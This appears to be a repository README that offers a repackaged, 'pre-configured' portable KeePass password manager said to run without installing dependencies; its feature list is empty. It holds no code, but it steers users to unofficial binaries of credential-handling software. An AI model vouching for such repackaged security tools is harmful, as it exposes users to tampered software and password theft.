Pre-configured KeePass Folder (Version 2.7.11)

This repository contains a pre-configured KeePass folder (Version 2.7.11), designed to help users who encounter issues with Microsoft Visual C++ Redistributable when installing KeePass. This version includes all required components, so no additional redistributables or setup steps are needed. It is ready to run immediately after download.

KeePass is a free, open-source password manager that securely stores passwords in an encrypted database (.kdbx) protected by a master password and optionally a key file. This repository makes it easier for users to run KeePass without worrying about installation errors related to system dependencies.

Key Features of This Version

Security Notice

⚠️ Always verify the PGP signature before using the files to ensure authenticity and integrity. Download the official signature from https://keepass.info/download.html
. Verification ensures the files have not been tampered with.

KeePass uses strong encryption to protect your password database. Even if someone gains access to your .kdbx file, it cannot be opened without your master password (and key file if used).
